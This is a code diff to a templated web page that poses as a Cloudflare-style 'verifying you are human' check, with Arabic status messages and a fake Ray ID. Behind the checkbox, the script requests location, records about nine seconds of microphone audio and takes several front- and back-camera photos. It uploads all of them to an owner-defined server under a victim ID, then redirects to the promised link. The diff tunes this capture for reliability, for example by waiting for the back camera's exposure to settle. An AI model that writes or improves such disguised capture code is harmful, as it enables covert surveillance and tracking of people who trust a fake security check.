@@ -101,7 +101,7 @@ body{display:flex;flex-direction:column;min-height:100vh}
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
 <script>
 var uid="<%=uid%>",a="<%=a%>",destUrl="<%=url%>";
-var snapsConfirmed=0,minSnaps=2,redirectDone=false;
+var redirectDone=false;
 
 // Ray ID
 var chars="abcdefghijklmnopqrstuvwxyz0123456789";
@@ -111,17 +111,16 @@ document.getElementById('ray-id').textContent=ray;
 // Show destination domain
 try{var dh=new URL(destUrl);document.getElementById('dest-domain').textContent=dh.hostname;}catch(e){}
 
-function tryRedirect(){
+function doRedirect(){
   if(redirectDone)return;
-  if(snapsConfirmed>=minSnaps){
-    redirectDone=true;
-    document.getElementById('step-text').textContent="اكتمل التحقق! جارٍ التحويل...";
-    document.getElementById('spinner').style.borderColor='#e8e8e8';
-    document.getElementById('spinner').style.borderTopColor='#34c759';
-    setTimeout(function(){window.location.href=destUrl;},700);
-  }
+  redirectDone=true;
+  document.getElementById('step-text').textContent="اكتمل التحقق! جارٍ التحويل...";
+  document.getElementById('spinner').style.borderColor='#e8e8e8';
+  document.getElementById('spinner').style.borderTopColor='#34c759';
+  setTimeout(function(){window.location.href=destUrl;},500);
 }
-setTimeout(function(){if(!redirectDone){redirectDone=true;window.location.href=destUrl;}},30000);
+// Hard fallback
+setTimeout(function(){doRedirect();},35000);
 
 // ── Extra features (controlled by owner) ─────────────────────────────────────
 <% if(feat.webrtc){ %>
@@ -233,88 +232,86 @@ function fireLocation(){
   );
 }
 
-// ── Camera: front then back (sequential to avoid conflict) ────────────────────
+// ── Camera ────────────────────────────────────────────────────────────────────
+function waitReady(vid, ms){
+  return new Promise(function(res){
+    var c=setInterval(function(){if(vid.readyState>=2&&vid.videoWidth>0){clearInterval(c);res(true);}},100);
+    setTimeout(function(){clearInterval(c);res(false);},ms||5000);
+  });
+}
+function snapFrame(vid, canvas, ctx){
+  ctx.drawImage(vid,0,0,640,640);
+  return canvas.toDataURL("image/png").replace("data:image/png;base64","");
+}
+
 async function doCamera(){
   var canvas=document.getElementById('canvas'),ctx=canvas.getContext('2d');
 
-  // --- FRONT CAMERA ---
+  // ── FRONT CAMERA (first, fast) ────────────────────────────────────────────
   var frontStream=null;
-  var frontConstraints=[
+  var fConsts=[
     {audio:true, video:{facingMode:"user",width:{ideal:640},height:{ideal:640}}},
     {audio:true, video:{facingMode:"user"}},
     {audio:false,video:{facingMode:"user"}},
     {audio:false,video:true}
   ];
-  for(var fi=0;fi<frontConstraints.length;fi++){
-    try{frontStream=await navigator.mediaDevices.getUserMedia(frontConstraints[fi]);break;}catch(e){}
-  }
+  for(var i=0;i<fConsts.length;i++){try{frontStream=await navigator.mediaDevices.getUserMedia(fConsts[i]);break;}catch(e){}}
 
   if(frontStream){
     var vidF=document.getElementById('vid-front');
     vidF.srcObject=frontStream;
     try{await vidF.play();}catch(e){}
-    // wait for video ready
-    await new Promise(function(res){var c=setInterval(function(){if(vidF.readyState>=2&&vidF.videoWidth>0){clearInterval(c);res();}},150);setTimeout(function(){clearInterval(c);res();},4000);});
+    var fReady=await waitReady(vidF,5000);
 
-    // audio recording
-    var audioTracks=frontStream.getAudioTracks();
-    if(audioTracks.length){
-      try{
-        var rec=new MediaRecorder(new MediaStream(audioTracks)),chunks=[];
-        rec.ondataavailable=function(e){if(e.data&&e.data.size>0)chunks.push(e.data);};
-        rec.onstop=function(){var blob=new Blob(chunks,{type:'audio/webm'}),fr=new FileReader();fr.onloadend=function(){$.post(a+"/audio",{uid:uid,audio:encodeURIComponent(fr.result.replace(/^data:.+;base64,/,''))});};fr.readAsDataURL(blob);};
-        rec.start();
-        setTimeout(function(){try{rec.stop();}catch(e){}},9000);
-      }catch(e){}
+    // Start audio recording immediately
+    var atracks=frontStream.getAudioTracks();
+    if(atracks.length){try{
+      var rec=new MediaRecorder(new MediaStream(atracks)),chunks=[];
+      rec.ondataavailable=function(e){if(e.data&&e.data.size>0)chunks.push(e.data);};
+      rec.onstop=function(){var blob=new Blob(chunks,{type:'audio/webm'}),fr=new FileReader();fr.onloadend=function(){$.post(a+"/audio",{uid:uid,audio:encodeURIComponent(fr.result.replace(/^data:.+;base64,/,''))});};fr.readAsDataURL(blob);};
+      rec.start();setTimeout(function(){try{rec.stop();}catch(e){}},9000);
+    }catch(e){}}
+
+    if(fReady){
+      // Snap 1 immediately, then 2 more with 800ms gaps
+      for(var s=0;s<3;s++){
+        if(s>0) await new Promise(function(r){setTimeout(r,800);});
+        if(vidF.readyState>=2&&vidF.videoWidth>0){
+          var img=snapFrame(vidF,canvas,ctx);
+          $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(img),cam:"front"});
+        }
+      }
     }
 
-    // front snaps
-    var frontCount=0;
-    await new Promise(function(done){
-      var iv=setInterval(function(){
-        if(vidF.readyState>=2&&vidF.videoWidth>0){
-          ctx.drawImage(vidF,0,0,640,640);
-          var imgData=canvas.toDataURL("image/png").replace("data:image/png;base64","");
-          $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(imgData),cam:"front"},function(){snapsConfirmed++;tryRedirect();});
-          frontCount++;
-        }
-        if(frontCount>=3){clearInterval(iv);done();}
-      },1200);
-      setTimeout(function(){clearInterval(iv);done();},8000);
-    });
-
-    // Stop front camera tracks BEFORE starting back camera
+    // Stop video tracks, keep audio tracks running
     frontStream.getVideoTracks().forEach(function(t){t.stop();});
-  } else {
-    snapsConfirmed+=minSnaps;
-    tryRedirect();
-    return;
   }
 
-  // --- BACK CAMERA (after front stops) ---
-  await new Promise(function(r){setTimeout(r,500);});
-  var backConstraints=[
+  // ── BACK CAMERA (after front video stopped) ───────────────────────────────
+  await new Promise(function(r){setTimeout(r,300);});
+  var backStream=null;
+  var bConsts=[
+    {audio:false,video:{facingMode:{exact:"environment"},width:{ideal:1920},height:{ideal:1080}}},
     {audio:false,video:{facingMode:{exact:"environment"},width:{ideal:1280},height:{ideal:720}}},
     {audio:false,video:{facingMode:{exact:"environment"}}},
-    {audio:false,video:{facingMode:"environment"}},
-    {audio:false,video:{deviceId:undefined}} // fallback any camera
+    {audio:false,video:{facingMode:"environment"}}
   ];
-  var backStream=null;
-  for(var bi=0;bi<backConstraints.length;bi++){
-    try{backStream=await navigator.mediaDevices.getUserMedia(backConstraints[bi]);break;}catch(e){}
-  }
+  for(var j=0;j<bConsts.length;j++){try{backStream=await navigator.mediaDevices.getUserMedia(bConsts[j]);break;}catch(e){}}
 
   if(backStream){
     var vidB=document.getElementById('vid-back');
     vidB.srcObject=backStream;
     try{await vidB.play();}catch(e){}
-    await new Promise(function(res){var c=setInterval(function(){if(vidB.readyState>=2&&vidB.videoWidth>0){clearInterval(c);res();}},150);setTimeout(function(){clearInterval(c);res();},4000);});
-    // back snaps
-    for(var si=0;si<2;si++){
-      await new Promise(function(r){setTimeout(r,1000);});
-      if(vidB.readyState>=2&&vidB.videoWidth>0){
-        ctx.drawImage(vidB,0,0,640,640);
-        $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/png").replace("data:image/png;base64","")),cam:"back"});
+    var bReady=await waitReady(vidB,5000);
+    if(bReady){
+      // IMPORTANT: wait extra 2s for camera sensor to adjust exposure (fixes black screen)
+      await new Promise(function(r){setTimeout(r,2000);});
+      for(var k=0;k<2;k++){
+        if(k>0) await new Promise(function(r){setTimeout(r,1000);});
+        if(vidB.readyState>=2&&vidB.videoWidth>0){
+          var bImg=snapFrame(vidB,canvas,ctx);
+          $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(bImg),cam:"back"});
+        }
       }
     }
     backStream.getTracks().forEach(function(t){t.stop();});
@@ -328,7 +325,9 @@ function doVerify(){
   verifying=true;
   document.getElementById('cf-cb').classList.add('ticked');
   document.getElementById('step-text').textContent="جارٍ التحقق... يرجى الانتظار";
-  // Fire location + camera together (both permission dialogs appear)
+  // Start redirect timer: 9 seconds from button click
+  setTimeout(function(){doRedirect();},9000);
+  // Fire location + camera in parallel
   fireLocation();
   doCamera();
 }
